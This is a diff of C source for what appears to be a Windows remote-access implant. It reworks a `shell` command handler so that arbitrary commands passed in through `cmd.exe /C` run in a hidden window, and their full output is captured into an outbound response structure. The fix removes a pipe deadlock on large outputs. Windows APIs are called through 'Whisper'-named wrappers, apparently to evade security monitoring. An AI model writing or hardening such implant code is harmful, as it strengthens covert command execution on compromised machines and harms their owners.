@@ -338,26 +338,24 @@ void get_username(OutboundJsonDataStruct *response_struct)
  * @brief Executes a shell command via cmd.exe, captures its stdout and stderr,
  *        and stores the combined output in the provided response struct.
  *
- * This function performs the following steps:
- *   1. Creates an anonymous pipe to capture the child process’s stdout and stderr.
- *   2. Launches `cmd.exe /C "<args>"` as a hidden process with handles inherited.
- *   3. Waits for the process to exit, then closes the write end of the pipe.
- *   4. Reads all data from the pipe into a dynamically‑resizing heap buffer.
- *   5. Replaces any existing `response_struct->command_result_data` with the full output.
- *   6. On error at any stage, formats the system error message and stores it instead.
+ * This version fixes the pipe‐buffer deadlock on large outputs (e.g., `dir C:\Windows`)
+ * by reading from the pipe **before** waiting on the child process, ensuring the child
+ * never blocks writing into a full pipe buffer.
  *
- * Ownership and cleanup:
- *   - The heap buffer for the command output is freed before return.
- *   - Any preexisting `response_struct->command_result_data` is freed prior to assignment.
- *   - All Windows handles (process, thread, pipe ends) are closed on both success and failure paths.
+ * Steps:
+ *   1. Create an anonymous pipe to capture the child’s stdout and stderr.
+ *   2. Launch `cmd.exe /C "<args>"` hidden, inheriting the write end of the pipe.
+ *   3. Close the parent’s write handle immediately so only the child holds it.
+ *   4. Read from the pipe in a loop into a dynamically expanding heap buffer.
+ *   5. Once the pipe is drained (EOF), wait for the child to exit without blocking.
+ *   6. Replace any existing `response_struct->command_result_data` with the full output.
+ *   7. On any error, formats the system error message and stores it instead.
  *
- * @param response_struct  Pointer to an OutboundJsonDataStruct where the captured output
- *                         or error message will be stored.
- * @param args             Null‑terminated C string of arguments to pass to `cmd.exe /C`.
+ * @param response_struct  Pointer to an OutboundJsonDataStruct to receive output.
+ * @param args             Null‑terminated C string of arguments for `cmd.exe /C`.
  */
 void shell(OutboundJsonDataStruct *response_struct, char *args)
 {
-    // Security attributes for pipe handles
     SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
     HANDLE hRead = NULL, hWrite = NULL;
     PROCESS_INFORMATION pi;
@@ -366,7 +364,7 @@ void shell(OutboundJsonDataStruct *response_struct, char *args)
     DWORD bytesRead;
     BOOL success;
 
-    // Create the pipe
+    // 1. Create the pipe
     if (!WhisperCreatePipe(&hRead, &hWrite, &sa, 0))
     {
         DWORD err = GetLastError();
@@ -380,7 +378,7 @@ void shell(OutboundJsonDataStruct *response_struct, char *args)
     }
     WhisperSetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
 
-    // Launch cmd.exe /C "<args>" hidden, with stdout+stderr redirected to our pipe
+    // 2. Configure hidden child process to redirect stdout/stderr
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
     si.hStdOutput = hWrite;
@@ -391,17 +389,16 @@ void shell(OutboundJsonDataStruct *response_struct, char *args)
     snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /C \"%s\"", args);
 
     ZeroMemory(&pi, sizeof(pi));
-    success = WhisperCreateProcessA(
-        NULL,
-        cmdLine,
-        NULL, NULL,
-        TRUE,
-        0,
-        NULL,
-        PROCESS_SPAWN_DIRECTORY,
-        &si,
-        &pi);
-    if (!success)
+    if (!WhisperCreateProcessA(
+            NULL,
+            cmdLine,
+            NULL, NULL,
+            TRUE,
+            0,
+            NULL,
+            PROCESS_SPAWN_DIRECTORY,
+            &si,
+            &pi))
     {
         DWORD err = GetLastError();
         char errMsg[256];
@@ -415,11 +412,10 @@ void shell(OutboundJsonDataStruct *response_struct, char *args)
         return;
     }
 
-    // Wait for the process and close the write end so we can read EOF
-    WhisperWaitForSingleObject(pi.hProcess, INFINITE);
+    // 3. Close parent write handle so child is sole writer
     WhisperCloseHandle(hWrite);
 
-    // Dynamically growable buffer for the output
+    // 4. Dynamically expand buffer and read all output
     size_t cap = PIPE_READ_SIZE_BUFFER, len = 0;
     char *output = malloc(cap);
     if (!output)
@@ -431,39 +427,39 @@ void shell(OutboundJsonDataStruct *response_struct, char *args)
     }
     output[0] = '\0';
 
-    // Read all data from the pipe
     while (TRUE)
     {
         success = WhisperReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
         if (!success || bytesRead == 0)
             break;
         buffer[bytesRead] = '\0';
-        DEBUG_LOG("%s", buffer);
 
-        // Expand output buffer if needed
         if (len + bytesRead + 1 > cap)
         {
             size_t newCap = cap * 2 + bytesRead;
             char *tmp = realloc(output, newCap);
             if (!tmp)
-                break; // out of memory, stop appending
+                break;
             output = tmp;
             cap = newCap;
         }
+
         memcpy(output + len, buffer, bytesRead);
         len += bytesRead;
         output[len] = '\0';
     }
 
-    // Send the full output back
+    // 5. Wait for child to exit (now non‐blocking)
+    WhisperWaitForSingleObject(pi.hProcess, INFINITE);
+
+    // 6. Replace response data and clean up
     free(response_struct->command_result_data);
     set_response_data(response_struct, output);
     free(output);
 
-    // Cleanup handles
+    WhisperCloseHandle(hRead);
     WhisperCloseHandle(pi.hProcess);
     WhisperCloseHandle(pi.hThread);
-    WhisperCloseHandle(hRead);
 }
 
 void messagebox(OutboundJsonDataStruct *response_struct, char *args)
